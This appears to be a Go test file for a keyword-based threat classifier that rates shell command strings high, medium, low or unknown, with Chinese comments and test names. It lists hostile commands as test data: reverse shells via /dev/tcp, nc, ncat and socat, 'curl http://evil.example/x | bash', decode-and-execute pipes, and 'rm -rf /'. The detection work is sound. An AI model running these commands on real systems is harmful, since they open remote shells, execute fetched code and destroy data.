package security

import "testing"

// TestThreatConfidenceLevels 按高/中/低/未知四个等级逐一验证关键词匹配。
func TestThreatConfidenceLevels(t *testing.T) {
	cases := []struct {
		name    string
		pattern string
		want    string
	}{
		// 高危：反弹 shell、下载即执行、解码执行、大范围强制删除。
		{"tcp reverse shell", "/dev/tcp/10.0.0.1/4444", "high"},
		{"reverse shell english", "reverse-shell", "high"},
		{"reverse shell cjk", "反弹shell", "high"},
		{"reverse shell cjk short", "反弹", "high"},
		{"download exec english", "download-exec", "high"},
		{"download exec cjk", "下载执行", "high"},
		{"curl pipe bash", "curl|bash", "high"},
		{"curl pipe bash spaced", "curl http://evil.example/x | bash", "high"},
		{"pipe to sh", "echo payload | sh", "high"},
		{"base64 decode pipe", "base64 -d | sh", "high"},
		{"xxd reverse pipe", "xxd -r -p | bash", "high"},
		{"netcat exec", "nc -e /bin/sh 10.0.0.1 4444", "high"},
		{"ncat exec", "ncat --exec /bin/bash 10.0.0.1 4444", "high"},
		{"socat exec", "socat TCP-LISTEN:4444 EXEC:/bin/sh", "high"},
		{"forced rm root", "rm -rf /", "high"},
		{"forced rm etc", "rm -rf /etc", "high"},
		{"forced rm wildcard", "rm -f /*", "high"},
		{"forced rm long flag", "rm --force /var", "high"},

		// 中危：具体目标的强制删除、包装器提权、单纯下载。
		{"forced rm category", "forced-rm", "medium"},
		{"forced rm cjk", "强制删除", "medium"},
		{"forced rm specific file", "rm -f notes.txt", "medium"},
		{"forced rm specific dir", "rm -rf project/build", "medium"},
		{"sudo wrapper", "sudo rm -f file", "medium"},
		{"nohup wrapper", "nohup rm -f file", "medium"},
		{"download plain", "download", "medium"},
		{"download cjk", "下载", "medium"},
		{"curl plain", "curl https://example.com/health", "medium"},
		{"wget plain", "wget -qO- http://example.com", "medium"},

		// 低危：普通修改类命令及其同义词。
		{"rm plain", "rm", "low"},
		{"mv", "mv file1 file2", "low"},
		{"cp", "cp a b", "low"},
		{"chmod", "chmod 777 x", "low"},
		{"chown", "chown root file", "low"},
		{"dd", "dd if=src of=dst", "low"},
		{"del", "del file.txt", "low"},
		{"rename", "rename old new", "low"},
		{"delete cjk", "删除文件", "low"},
		{"modify cjk", "修改配置", "low"},
		{"write cjk", "写入数据", "low"},

		// 未知：空值或不含任何已知关键词。
		{"empty", "", "unknown"},
		{"whitespace", "   \t ", "unknown"},
		{"git status", "git status", "unknown"},
		{"npm install", "npm install", "unknown"},
		{"random cjk", "随便写点什么", "unknown"},
		{"harmless cjk", "无害模式", "unknown"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := threatConfidence(tc.pattern); got != tc.want {
				t.Fatalf("threatConfidence(%q) = %q, want %q", tc.pattern, got, tc.want)
			}
		})
	}
}

// TestThreatConfidenceCaseInsensitive 验证大小写不敏感，且不同大小写写法得到相同等级。
func TestThreatConfidenceCaseInsensitive(t *testing.T) {
	cases := []struct {
		lower string
		upper string
		want  string
	}{
		{"/dev/tcp/10.0.0.1/4444", "/DEV/TCP/10.0.0.1/4444", "high"},
		{"reverse shell", "ReVeRsE ShElL", "high"},
		{"curl|bash", "CURL|BASH", "high"},
		{"sudo rm -f file", "SUDO RM -F FILE", "medium"},
		{"forced-rm", "Forced-RM", "medium"},
		{"del file", "DEL FILE", "low"},
	}
	for _, tc := range cases {
		t.Run(tc.lower, func(t *testing.T) {
			if got := threatConfidence(tc.lower); got != tc.want {
				t.Fatalf("threatConfidence(%q) = %q, want %q", tc.lower, got, tc.want)
			}
			if got := threatConfidence(tc.upper); got != tc.want {
				t.Fatalf("threatConfidence(%q) = %q, want %q", tc.upper, got, tc.want)
			}
		})
	}
}

// TestThreatConfidenceCJKSafe 验证中文关键词与中英混排输入都能正确处理，且不会
// 因字节切片而破坏 UTF-8 或产生 panic。
func TestThreatConfidenceCJKSafe(t *testing.T) {
	cases := []struct {
		pattern string
		want    string
	}{
		{"反弹Shell", "high"},     // 中英混排的高危关键词
		{"下载执行payload", "high"}, // 中文关键词后接 ASCII
		{"删除 rm -rf /", "high"}, // 中文前缀不影响后续 ASCII 命中
		{"强制删除文件", "medium"},    // 中文关键词命中中危
		{"中文🔥测试", "unknown"},    // 无关键词的中文与 emoji 输入
		{"执行删除与写入操作", "low"},    // 中文低危关键词
	}
	for _, tc := range cases {
		t.Run(tc.pattern, func(t *testing.T) {
			if got := threatConfidence(tc.pattern); got != tc.want {
				t.Fatalf("threatConfidence(%q) = %q, want %q", tc.pattern, got, tc.want)
			}
		})
	}
}

// TestThreatConfidenceStable 验证函数是稳定的纯函数：同一输入重复调用结果一致，
// 且返回值始终落在四个合法等级之一。
func TestThreatConfidenceStable(t *testing.T) {
	corpus := []string{
		"rm -rf /", "curl http://evil.example/x | bash", "反弹shell", "下载执行",
		"rm -f notes.txt", "sudo rm -f x", "mv a b", "删除文件", "git status", "", "中文测试",
	}
	allowed := map[string]bool{
		"high": true, "medium": true, "low": true, "unknown": true,
	}
	for _, pattern := range corpus {
		first := threatConfidence(pattern)
		if !allowed[first] {
			t.Fatalf("threatConfidence(%q) = %q, not an allowed level", pattern, first)
		}
		for i := 0; i < 10; i++ {
			if got := threatConfidence(pattern); got != first {
				t.Fatalf("threatConfidence(%q) unstable: %q vs %q", pattern, first, got)
			}
		}
	}
}

// TestThreatConfidenceHighestWins 验证当一段模式同时命中多个等级时，返回最高等级。
func TestThreatConfidenceHighestWins(t *testing.T) {
	cases := []struct {
		pattern string
		want    string
	}{
		{"sudo rm -rf /", "high"},  // 同时命中 medium 的 sudo 与 high 的 rm -rf /
		{"下载执行 curl|bash", "high"}, // 同时命中 high 的下载执行与 curl|bash
		{"强制删除 rm -f x", "medium"}, // 同时命中 medium 的强制删除与 low 的 rm
		{"删除并修改 mv a b", "low"},    // 同时命中多个 low 关键词
		{"无害的下载 curl", "medium"},   // medium 优先于空
	}
	for _, tc := range cases {
		t.Run(tc.pattern, func(t *testing.T) {
			if got := threatConfidence(tc.pattern); got != tc.want {
				t.Fatalf("threatConfidence(%q) = %q, want %q", tc.pattern, got, tc.want)
			}
		})
	}
}
